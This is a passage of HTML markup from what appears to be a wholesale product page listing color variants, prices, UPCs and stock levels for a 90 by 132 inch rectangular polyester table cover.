                                                        <img src="uploads/palette/20140523040659wh.jpg" width="31">&nbsp;(WH) White										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026">
                                                        <input type="hidden" name="item_name[38-0026]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - White">
                                                        <input type="hidden" name="item_image[38-0026]" value="https://portofino.azureedge.net/38-0026.jpg">
                                                        <input type="hidden" name="item_class[38-0026]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026]" value="745721051442">
                                                        <input type="hidden" name="color[38-0026]" value="WH">
                                                        <input type="hidden" name="discount[38-0026]" value="">
                                                        <input type="hidden" name="discount_2[38-0026]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026]" value="">
                                                        <input type="hidden" name="isSale[38-0026]" value="0">
                                                        <input type="hidden" name="isNew[38-0026]" value="">
                                                        <input type="hidden" name="isBack[38-0026]" value="">
                                                        <select class="item_total_qty" id="color-total-1" name="total_qty[38-0026]" onchange="moreQty(this.value, '468','38-0026',1);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                            <option value="156">156 (13 cases)</option>
                                                            <option value="168">168 (14 cases)</option>
                                                            <option value="180">180 (15 cases)</option>
                                                            <option value="192">192 (16 cases)</option>
                                                            <option value="204">204 (17 cases)</option>
                                                            <option value="216">216 (18 cases)</option>
                                                            <option value="228">228 (19 cases)</option>
                                                            <option value="240">240 (20 cases)</option>
                                                            <option value="252">252 (21 cases)</option>
                                                            <option value="264">264 (22 cases)</option>
                                                            <option value="276">276 (23 cases)</option>
                                                            <option value="288">288 (24 cases)</option>
                                                            <option value="300">300 (25 cases)</option>
                                                            <option value="312">312 (26 cases)</option>
                                                            <option value="324">324 (27 cases)</option>
                                                            <option value="336">336 (28 cases)</option>
                                                            <option value="348">348 (29 cases)</option>
                                                            <option value="360">360 (30 cases)</option>
                                                            <option value="372">372 (31 cases)</option>
                                                            <option value="384">384 (32 cases)</option>
                                                            <option value="396">396 (33 cases)</option>
                                                            <option value="408">408 (34 cases)</option>
                                                            <option value="420">420 (35 cases)</option>
                                                            <option value="432">432 (36 cases)</option>
                                                            <option value="444">444 (37 cases)</option>
                                                            <option value="456">456 (38 cases)</option>
                                                            <option value="468">468 (39 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-1" name="request_qty[38-0026]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_3" style="display:none;">38-0026BG</span>
                                                <span id="pr_series_image_3" style="display:none;">https://portofino.azureedge.net/38-0026BG.jpg</span>
                                                <span id="pr_series_upc_3" style="display:none;">745910743332</span>
                                                <span id="pr_series_case_price_3" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_3" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_3" style="display:none;"></span>
                                                <span id="pr_series_discount_2_3" style="display:none;"></span>
                                                <span id="pr_series_availability_3" style="display:none;">9 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(3);">
                                                        <img src="uploads/palette/20140707134350BG.jpg" width="31">&nbsp;(BG) Burgundy										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026BG">
                                                        <input type="hidden" name="item_name[38-0026BG]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Burgundy">
                                                        <input type="hidden" name="item_image[38-0026BG]" value="https://portofino.azureedge.net/38-0026BG.jpg">
                                                        <input type="hidden" name="item_class[38-0026BG]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026BG]" value="745910743332">
                                                        <input type="hidden" name="color[38-0026BG]" value="BG">
                                                        <input type="hidden" name="discount[38-0026BG]" value="">
                                                        <input type="hidden" name="discount_2[38-0026BG]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026BG]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026BG]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026BG]" value="">
                                                        <input type="hidden" name="isSale[38-0026BG]" value="0">
                                                        <input type="hidden" name="isNew[38-0026BG]" value="">
                                                        <input type="hidden" name="isBack[38-0026BG]" value="">
                                                        <select class="item_total_qty" id="color-total-3" name="total_qty[38-0026BG]" onchange="moreQty(this.value, '108','38-0026BG',3);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-3" name="request_qty[38-0026BG]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_4" style="display:none;">38-0026BH</span>
                                                <span id="pr_series_image_4" style="display:none;">https://portofino.azureedge.net/38-0026BH.jpg</span>
                                                <span id="pr_series_upc_4" style="display:none;">745910734842</span>
                                                <span id="pr_series_case_price_4" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_4" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_4" style="display:none;"></span>
                                                <span id="pr_series_discount_2_4" style="display:none;"></span>
                                                <span id="pr_series_availability_4" style="display:none;">4 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(4);">
                                                        <img src="uploads/palette/20180205143612BH.jpg" width="31">&nbsp;(BH) Blush										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026BH">
                                                        <input type="hidden" name="item_name[38-0026BH]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Blush">
                                                        <input type="hidden" name="item_image[38-0026BH]" value="https://portofino.azureedge.net/38-0026BH.jpg">
                                                        <input type="hidden" name="item_class[38-0026BH]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026BH]" value="745910734842">
                                                        <input type="hidden" name="color[38-0026BH]" value="BH">
                                                        <input type="hidden" name="discount[38-0026BH]" value="">
                                                        <input type="hidden" name="discount_2[38-0026BH]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026BH]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026BH]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026BH]" value="">
                                                        <input type="hidden" name="isSale[38-0026BH]" value="0">
                                                        <input type="hidden" name="isNew[38-0026BH]" value="">
                                                        <input type="hidden" name="isBack[38-0026BH]" value="">
                                                        <select class="item_total_qty" id="color-total-4" name="total_qty[38-0026BH]" onchange="moreQty(this.value, '48','38-0026BH',4);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-4" name="request_qty[38-0026BH]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_5" style="display:none;">38-0026BK</span>
                                                <span id="pr_series_image_5" style="display:none;">https://portofino.azureedge.net/38-0026BK.jpg</span>
                                                <span id="pr_series_upc_5" style="display:none;">745721066361</span>
                                                <span id="pr_series_case_price_5" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_5" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_5" style="display:none;"></span>
                                                <span id="pr_series_discount_2_5" style="display:none;"></span>
                                                <span id="pr_series_availability_5" style="display:none;">13 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(5);">
                                                        <img src="uploads/palette/20140523040545bk.jpg" width="31">&nbsp;(BK) Black										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026BK">
                                                        <input type="hidden" name="item_name[38-0026BK]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Black">
                                                        <input type="hidden" name="item_image[38-0026BK]" value="https://portofino.azureedge.net/38-0026BK.jpg">
                                                        <input type="hidden" name="item_class[38-0026BK]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026BK]" value="745721066361">
                                                        <input type="hidden" name="color[38-0026BK]" value="BK">
                                                        <input type="hidden" name="discount[38-0026BK]" value="">
                                                        <input type="hidden" name="discount_2[38-0026BK]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026BK]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026BK]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026BK]" value="">
                                                        <input type="hidden" name="isSale[38-0026BK]" value="0">
                                                        <input type="hidden" name="isNew[38-0026BK]" value="">
                                                        <input type="hidden" name="isBack[38-0026BK]" value="Y">
                                                        <select class="item_total_qty" id="color-total-5" name="total_qty[38-0026BK]" onchange="moreQty(this.value, '156','38-0026BK',5);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                            <option value="132">132 (11 cases)</option>
                                                            <option value="144">144 (12 cases)</option>
                                                            <option value="156">156 (13 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-5" name="request_qty[38-0026BK]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_6" style="display:none;">38-0026BL</span>
                                                <span id="pr_series_image_6" style="display:none;">https://portofino.azureedge.net/38-0026BL.jpg</span>
                                                <span id="pr_series_upc_6" style="display:none;">745910743387</span>
                                                <span id="pr_series_case_price_6" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_6" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_6" style="display:none;"></span>
                                                <span id="pr_series_discount_2_6" style="display:none;"></span>
                                                <span id="pr_series_availability_6" style="display:none;">1 Case and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(6);">
                                                        <img src="uploads/palette/20140707134340BL.jpg" width="31">&nbsp;(BL) Blue										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026BL">
                                                        <input type="hidden" name="item_name[38-0026BL]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Blue">
                                                        <input type="hidden" name="item_image[38-0026BL]" value="https://portofino.azureedge.net/38-0026BL.jpg">
                                                        <input type="hidden" name="item_class[38-0026BL]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026BL]" value="745910743387">
                                                        <input type="hidden" name="color[38-0026BL]" value="BL">
                                                        <input type="hidden" name="discount[38-0026BL]" value="">
                                                        <input type="hidden" name="discount_2[38-0026BL]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026BL]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026BL]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026BL]" value="">
                                                        <input type="hidden" name="isSale[38-0026BL]" value="0">
                                                        <input type="hidden" name="isNew[38-0026BL]" value="">
                                                        <input type="hidden" name="isBack[38-0026BL]" value="">
                                                        <select class="item_total_qty" id="color-total-6" name="total_qty[38-0026BL]" onchange="moreQty(this.value, '12','38-0026BL',6);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-6" name="request_qty[38-0026BL]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_7" style="display:none;">38-0026CH</span>
                                                <span id="pr_series_image_7" style="display:none;">https://portofino.azureedge.net/38-0026CH.jpg</span>
                                                <span id="pr_series_upc_7" style="display:none;">745910734835</span>
                                                <span id="pr_series_case_price_7" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_7" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_7" style="display:none;"></span>
                                                <span id="pr_series_discount_2_7" style="display:none;"></span>
                                                <span id="pr_series_availability_7" style="display:none;">8 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(7);">
                                                        <img src="uploads/palette/20140721195207CH.jpg" width="31">&nbsp;(CH) Champagne										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026CH">
                                                        <input type="hidden" name="item_name[38-0026CH]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Champagne">
                                                        <input type="hidden" name="item_image[38-0026CH]" value="https://portofino.azureedge.net/38-0026CH.jpg">
                                                        <input type="hidden" name="item_class[38-0026CH]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026CH]" value="745910734835">
                                                        <input type="hidden" name="color[38-0026CH]" value="CH">
                                                        <input type="hidden" name="discount[38-0026CH]" value="">
                                                        <input type="hidden" name="discount_2[38-0026CH]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026CH]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026CH]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026CH]" value="">
                                                        <input type="hidden" name="isSale[38-0026CH]" value="0">
                                                        <input type="hidden" name="isNew[38-0026CH]" value="">
                                                        <input type="hidden" name="isBack[38-0026CH]" value="">
                                                        <select class="item_total_qty" id="color-total-7" name="total_qty[38-0026CH]" onchange="moreQty(this.value, '96','38-0026CH',7);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-7" name="request_qty[38-0026CH]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_8" style="display:none;">38-0026CO</span>
                                                <span id="pr_series_image_8" style="display:none;">https://portofino.azureedge.net/38-0026CO.jpg</span>
                                                <span id="pr_series_upc_8" style="display:none;">745910743301</span>
                                                <span id="pr_series_case_price_8" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_8" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_8" style="display:none;">30.00</span>
                                                <span id="pr_series_discount_2_8" style="display:none;"></span>
                                                <span id="pr_series_availability_8" style="display:none;">10 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(8);">
                                                        <img src="uploads/palette/20140707133202CO.jpg" width="31">&nbsp;(CO) Coral										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026CO">
                                                        <input type="hidden" name="item_name[38-0026CO]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Coral">
                                                        <input type="hidden" name="item_image[38-0026CO]" value="https://portofino.azureedge.net/38-0026CO.jpg">
                                                        <input type="hidden" name="item_class[38-0026CO]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026CO]" value="745910743301">
                                                        <input type="hidden" name="color[38-0026CO]" value="CO">
                                                        <input type="hidden" name="discount[38-0026CO]" value="30.00">
                                                        <input type="hidden" name="discount_2[38-0026CO]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026CO]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026CO]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026CO]" value="Y">
                                                        <input type="hidden" name="isSale[38-0026CO]" value="0">
                                                        <input type="hidden" name="isNew[38-0026CO]" value="">
                                                        <input type="hidden" name="isBack[38-0026CO]" value="">
                                                        <select class="item_total_qty" id="color-total-8" name="total_qty[38-0026CO]" onchange="moreQty(this.value, '120','38-0026CO',8);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-8" name="request_qty[38-0026CO]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_9" style="display:none;">38-0026FG</span>
                                                <span id="pr_series_image_9" style="display:none;">https://portofino.azureedge.net/38-0026FG.jpg</span>
                                                <span id="pr_series_upc_9" style="display:none;">745910743400</span>
                                                <span id="pr_series_case_price_9" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_9" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_9" style="display:none;"></span>
                                                <span id="pr_series_discount_2_9" style="display:none;"></span>
                                                <span id="pr_series_availability_9" style="display:none;">6 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(9);">
                                                        <img src="uploads/palette/20140523041022fg.jpg" width="31">&nbsp;(FG) Forest Green										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026FG">
                                                        <input type="hidden" name="item_name[38-0026FG]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Forest Green">
                                                        <input type="hidden" name="item_image[38-0026FG]" value="https://portofino.azureedge.net/38-0026FG.jpg">
                                                        <input type="hidden" name="item_class[38-0026FG]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026FG]" value="745910743400">
                                                        <input type="hidden" name="color[38-0026FG]" value="FG">
                                                        <input type="hidden" name="discount[38-0026FG]" value="">
                                                        <input type="hidden" name="discount_2[38-0026FG]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026FG]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026FG]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026FG]" value="">
                                                        <input type="hidden" name="isSale[38-0026FG]" value="0">
                                                        <input type="hidden" name="isNew[38-0026FG]" value="">
                                                        <input type="hidden" name="isBack[38-0026FG]" value="">
                                                        <select class="item_total_qty" id="color-total-9" name="total_qty[38-0026FG]" onchange="moreQty(this.value, '72','38-0026FG',9);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-9" name="request_qty[38-0026FG]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_10" style="display:none;">38-0026GD</span>
                                                <span id="pr_series_image_10" style="display:none;">https://portofino.azureedge.net/38-0026GD.jpg</span>
                                                <span id="pr_series_upc_10" style="display:none;">745910734811</span>
                                                <span id="pr_series_case_price_10" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_10" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_10" style="display:none;"></span>
                                                <span id="pr_series_discount_2_10" style="display:none;"></span>
                                                <span id="pr_series_availability_10" style="display:none;">6 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(10);">
                                                        <img src="uploads/palette/20140523040802gd.jpg" width="31">&nbsp;(GD) Gold										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026GD">
                                                        <input type="hidden" name="item_name[38-0026GD]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Gold">
                                                        <input type="hidden" name="item_image[38-0026GD]" value="https://portofino.azureedge.net/38-0026GD.jpg">
                                                        <input type="hidden" name="item_class[38-0026GD]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026GD]" value="745910734811">
                                                        <input type="hidden" name="color[38-0026GD]" value="GD">
                                                        <input type="hidden" name="discount[38-0026GD]" value="">
                                                        <input type="hidden" name="discount_2[38-0026GD]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026GD]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026GD]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026GD]" value="">
                                                        <input type="hidden" name="isSale[38-0026GD]" value="0">
                                                        <input type="hidden" name="isNew[38-0026GD]" value="">
                                                        <input type="hidden" name="isBack[38-0026GD]" value="">
                                                        <select class="item_total_qty" id="color-total-10" name="total_qty[38-0026GD]" onchange="moreQty(this.value, '72','38-0026GD',10);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-10" name="request_qty[38-0026GD]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_11" style="display:none;">38-0026IV</span>
                                                <span id="pr_series_image_11" style="display:none;">https://portofino.azureedge.net/38-0026IV.jpg</span>
                                                <span id="pr_series_upc_11" style="display:none;">745721066378</span>
                                                <span id="pr_series_case_price_11" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_11" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_11" style="display:none;"></span>
                                                <span id="pr_series_discount_2_11" style="display:none;"></span>
                                                <span id="pr_series_availability_11" style="display:none;">10 Cases and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(11);">
                                                        <img src="uploads/palette/20140523040231iv.jpg" width="31">&nbsp;(IV) Ivory										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026IV">
                                                        <input type="hidden" name="item_name[38-0026IV]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Ivory">
                                                        <input type="hidden" name="item_image[38-0026IV]" value="https://portofino.azureedge.net/38-0026IV.jpg">
                                                        <input type="hidden" name="item_class[38-0026IV]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026IV]" value="745721066378">
                                                        <input type="hidden" name="color[38-0026IV]" value="IV">
                                                        <input type="hidden" name="discount[38-0026IV]" value="">
                                                        <input type="hidden" name="discount_2[38-0026IV]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026IV]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026IV]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026IV]" value="">
                                                        <input type="hidden" name="isSale[38-0026IV]" value="0">
                                                        <input type="hidden" name="isNew[38-0026IV]" value="">
                                                        <input type="hidden" name="isBack[38-0026IV]" value="">
                                                        <select class="item_total_qty" id="color-total-11" name="total_qty[38-0026IV]" onchange="moreQty(this.value, '120','38-0026IV',11);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                            <option value="72">72 (6 cases)</option>
                                                            <option value="84">84 (7 cases)</option>
                                                            <option value="96">96 (8 cases)</option>
                                                            <option value="108">108 (9 cases)</option>
                                                            <option value="120">120 (10 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-11" name="request_qty[38-0026IV]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_12" style="display:none;">38-0026LA</span>
                                                <span id="pr_series_image_12" style="display:none;">https://portofino.azureedge.net/38-0026LA.jpg</span>
                                                <span id="pr_series_upc_12" style="display:none;">745910743271</span>
                                                <span id="pr_series_case_price_12" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_12" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_12" style="display:none;"></span>
                                                <span id="pr_series_discount_2_12" style="display:none;"></span>
                                                <span id="pr_series_availability_12" style="display:none;">1 Case and 1 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(12);">
                                                        <img src="uploads/palette/20140707134406LA.jpg" width="31">&nbsp;(LA) Lavender										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026LA">
                                                        <input type="hidden" name="item_name[38-0026LA]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Lavender">
                                                        <input type="hidden" name="item_image[38-0026LA]" value="https://portofino.azureedge.net/38-0026LA.jpg">
                                                        <input type="hidden" name="item_class[38-0026LA]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026LA]" value="745910743271">
                                                        <input type="hidden" name="color[38-0026LA]" value="LA">
                                                        <input type="hidden" name="discount[38-0026LA]" value="">
                                                        <input type="hidden" name="discount_2[38-0026LA]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026LA]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026LA]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026LA]" value="">
                                                        <input type="hidden" name="isSale[38-0026LA]" value="0">
                                                        <input type="hidden" name="isNew[38-0026LA]" value="">
                                                        <input type="hidden" name="isBack[38-0026LA]" value="">
                                                        <select class="item_total_qty" id="color-total-12" name="total_qty[38-0026LA]" onchange="moreQty(this.value, '12','38-0026LA',12);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-12" name="request_qty[38-0026LA]" value="0">
                                                    </div>
                                                </div>
                                                <span id="pr_series_number_13" style="display:none;">38-0026LG</span>
                                                <span id="pr_series_image_13" style="display:none;">https://portofino.azureedge.net/38-0026LG.jpg</span>
                                                <span id="pr_series_upc_13" style="display:none;">745910743295</span>
                                                <span id="pr_series_case_price_13" style="display:none;">8.95</span>
                                                <span id="pr_series_inner_price_13" style="display:none;">9.95</span>
                                                <span id="pr_series_discount_13" style="display:none;"></span>
                                                <span id="pr_series_discount_2_13" style="display:none;"></span>
                                                <span id="pr_series_availability_13" style="display:none;">5 Cases and 0 Inner</span>
                                                <div class="color-container-row color-container-row-border" rel="sub-color" style="display:none;">
                                                    <div class="color-container-col-first color-container-col-border-right" onmouseover="changeProductDisplay(13);">
                                                        <img src="uploads/palette/20140730191645CROSS.jpg" width="31">&nbsp;(LG) Our Lady of Grace										
                                                    </div>
                                                    <div class="color-container-col" style="width:170px;">
                                                        <input type="hidden" class="item_no" name="item_no[]" value="38-0026LG">
                                                        <input type="hidden" name="item_name[38-0026LG]" value="Rectangle Polyester Table Cover 90&quot; x 132&quot; - Lime Green">
                                                        <input type="hidden" name="item_image[38-0026LG]" value="https://portofino.azureedge.net/38-0026LG.jpg">
                                                        <input type="hidden" name="item_class[38-0026LG]" value="FAP001">
                                                        <input type="hidden" name="upc[38-0026LG]" value="745910743295">
                                                        <input type="hidden" name="color[38-0026LG]" value="LG">
                                                        <input type="hidden" name="discount[38-0026LG]" value="">
                                                        <input type="hidden" name="discount_2[38-0026LG]" value="">
                                                        <input type="hidden" name="item_case_price[38-0026LG]" value="8.95">
                                                        <input type="hidden" name="item_inner_price[38-0026LG]" value="9.95">
                                                        <input type="hidden" name="isRed[38-0026LG]" value="">
                                                        <input type="hidden" name="isSale[38-0026LG]" value="0">
                                                        <input type="hidden" name="isNew[38-0026LG]" value="">
                                                        <input type="hidden" name="isBack[38-0026LG]" value="">
                                                        <select class="item_total_qty" id="color-total-13" name="total_qty[38-0026LG]" onchange="moreQty(this.value, '60','38-0026LG',13);">
                                                            <option value="0"></option>
                                                            <option value="12">12 (1 case)</option>
                                                            <option value="24">24 (2 cases)</option>
                                                            <option value="36">36 (3 cases)</option>
                                                            <option value="48">48 (4 cases)</option>
                                                            <option value="60">60 (5 cases)</option>
                                                        </select>
                                                        <input type="hidden" id="color-request-13" name="request_qty[38-0026LG]" value="0">
                                                    </div>
                                                </div>
